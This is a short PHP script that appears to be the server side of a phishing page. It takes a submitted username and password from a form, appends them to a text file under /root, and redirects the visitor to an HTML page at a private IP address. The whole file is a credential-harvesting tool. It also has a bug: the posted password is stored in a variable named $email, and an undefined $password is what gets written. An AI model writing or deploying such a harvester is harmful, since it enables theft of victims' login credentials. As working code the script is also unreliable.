<?php
$username = $_POST['user'];
$email = $_POST['password'];
$file = fopen("/root/disk3/pass.txt", "a") or die ("file not open");
$f = $username." , ".$password;
fputs($file,$f) or die ("no data was written");
fclose($file);
header("Location: http://10.1.121.102/Redirect.html"); 
exit();
?>